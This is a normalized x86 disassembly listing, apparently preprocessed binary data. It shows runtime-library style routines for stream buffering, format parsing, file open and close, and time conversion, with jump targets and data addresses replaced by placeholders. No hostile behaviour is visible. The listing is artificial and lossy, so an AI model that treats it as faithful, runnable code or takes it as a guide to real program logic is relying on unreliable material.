lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_407a0e
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_408d2c
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_409d50
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_408d2c
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_409d0c
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_408b3a
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_407b23
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] edi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
xor edx edx
jmp r-xdata
cmp [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
inc edi
test bl bl
mov [ ebp + 0xc ] edi
jne r-xdata
jmp [ eax * 4 + jump_table_408244 ]
movsx eax bl
mov al [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov esi [ ebp - 0x30 ]
xor edx edx
or [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x24 ] edx
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] edx
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ esi + eax * 8 + r--data ]
sar eax 0x4
cmp eax 0x7
mov [ ebp - 0x30 ] eax
ja r-xdata
or [ ebp - 0x4 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x20 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408302
test eax eax
pop ecx
mov [ ebp - 0x20 ] eax
jge r-xdata
lea eax [ ecx + ecx * 4 ]
movsx ecx bl
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408302
test eax eax
pop ecx
mov [ ebp - 0x10 ] eax
jge r-xdata
cmp [ edi ] 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_408264
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_408264
mov bl [ edi ]
add esp 0xc
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x20 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x10 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x30 ] edx
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
lea edi [ ebp - 0x248 ]
cmp ecx edx
mov [ ebp - 0x8 ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc edi
inc edi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_40830f
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408302
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x10 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x3 ] 0x8
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x34 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x10 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x44 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
cmp bl 0x67
jne r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408302
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x2c ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_408302
pop ecx
xor edx edx
call sub_408302
pop ecx
jmp r-xdata
call sub_408302
pop ecx
movzx eax ax
jmp r-xdata
call sub_408302
pop ecx
movsx eax ax
mov esi eax
mov edi edx
test edx edx
jg r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x3 ] 0x2
jmp r-xdata
mov [ ebp - 0x10 ] 0x8
sub eax 0x3
je r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x2c ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
and edi 0x0
jl r-xdata
mov esi [ ebp - 0x10 ]
cmp esi 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x248 ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
call sub_405450
pop ecx
jmp r-xdata
test [ ebp - 0x3 ] 0x8
je r-xdata
call sub_408302
pop ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0xc ] 0x1
call sub_40831f
push eax
lea eax [ ebp - 0x248 ]
push eax
call sub_409e2f
add esp 0xc
mov [ ebp - 0xc ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x3 ] 0x8
mov [ ebp - 0x34 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov esi eax
neg edx
or [ ebp - 0x3 ] 0x1
mov edi edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_408302
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0x8 ] ecx
je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_409f10
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_409ea0
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_4082ca
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_408299
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_4082ca
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_408299
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_408299
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_4082ca
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_409e2f
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_408264
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_407a0e
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_408299
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_408264
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_4082ca
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_408264
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_40832d
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax edi
mov esi edi
sar eax 0x5
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push edi
call sub_40a172
cmp eax 0xffffffff
pop ecx
je r-xdata
xor ebp ebp
cmp edi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_409f85
pop ecx
jmp r-xdata
push 0x2
call sub_40a172
push 0x1
mov ebp eax
call sub_40a172
pop ecx
cmp eax ebp
pop ecx
je r-xdata
cmp edi 0x2
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_40a172
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebp eax
jmp r-xdata
push edi
call sub_40a0f8
mov eax [ ebx ]
pop ecx
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
je r-xdata
sub_4083e0
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_405f9f
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_40840b
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_408446
test eax eax
pop ecx
je r-xdata
push esi
call sub_4084ab
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40a1af
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_408446
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_408d2c
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4084ab
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rw-data ] esi
jle r-xdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_40840b
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_40840b
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_408518
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_409d0c
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_408944
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea edi [ edi + ecx * 8 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_4085f1
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_40a206
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_408761
mov edx [ rw-data ]
push ebx
push ebp
push esi
xor ebp ebp
xor esi esi
xor eax eax
cmp edx ebp
push edi
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ rw-data ]
mov edi ebx
mov edi eax
push 0x20
shl edi 0x2
call sub_4054cb
pop ecx
mov ecx [ rw-data ]
mov [ edi + ecx ] eax
mov eax [ rw-data ]
mov edi [ edi + eax ]
cmp edi ebp
je r-xdata
test [ ecx + 0xc ] 0x83
je r-xdata
mov esi edi
mov esi [ ebx + eax * 4 ]
jmp r-xdata
inc eax
add edi 0x4
cmp eax edx
jl r-xdata
or [ esi + 0x10 ] 0xffffffff
mov [ esi + 0x4 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
mov [ esi + 0x1c ] ebp
cmp esi ebp
je r-xdata
mov ecx [ edi ]
cmp ecx ebp
je r-xdata
jmp r-xdata
sub_4087d9
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x76c
cmp ebx 0x46
jl r-xdata
or eax 0xffffffff
cmp ebx 0x8a
jg r-xdata
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ edi * 4 + rw-data ]
add esi [ ebp + 0x10 ]
test bl 0x3
jne r-xdata
call sub_40a4bf
mov eax ebx
lea ecx [ ebx - 0x1 ]
imul eax eax 0x16d
sar ecx 0x2
mov edx esi
mov [ ebp - 0x8 ] esi
add edx ecx
mov [ ebp - 0x10 ] ebx
add eax edx
mov edx [ ebp + 0x1c ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1c ] eax
lea ecx [ eax + ecx * 8 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x18 ]
imul ecx ecx 0x3c
add ecx [ rw-data ]
dec edi
cmp [ ebp + 0x20 ] 0x1
mov [ ebp - 0x14 ] edi
pop edi
pop esi
lea ecx [ ecx + edx + 0x7c558180 ]
mov [ ebp + 0x8 ] ecx
je r-xdata
cmp edi 0x2
jle r-xdata
add ecx [ rw-data ]
cmp [ ebp + 0x20 ] 0xffffffff
jne r-xdata
inc esi
pop ebx
leave
retn
mov eax ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40a732
pop ecx
mov ecx [ ebp + 0x8 ]
test eax eax
je r-xdata
sub_40889b
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40aa1e
add esp 0x1c
test eax eax
jne r-xdata
sub_408910
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_408944
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp esi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax esi
and esi 0x1f
sar eax 0x5
shl esi 0x3
lea ebx [ eax * 4 + rw-data ]
mov eax [ eax * 4 + rw-data ]
add eax esi
mov dl [ eax + 0x4 ]
test dl 0x1
je r-xdata
and [ ebp - 0x8 ] 0x0
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] 0x0
mov ecx edi
je r-xdata
xor eax eax
jmp r-xdata
test dl 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test dl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ ebx ]
push [ ebp + 0x10 ]
push ecx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop ecx
cmp eax ecx
jne r-xdata
dec [ ebp + 0x10 ]
mov [ edi ] al
mov eax [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
jne r-xdata
mov [ rw-data ] 0x9
mov [ rw-data ] ecx
jmp r-xdata
and al 0xfb
cmp [ edi ] 0xa
jne r-xdata
push eax
call sub_409f85
pop ecx
jmp r-xdata
or eax 0xffffffff
sub edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
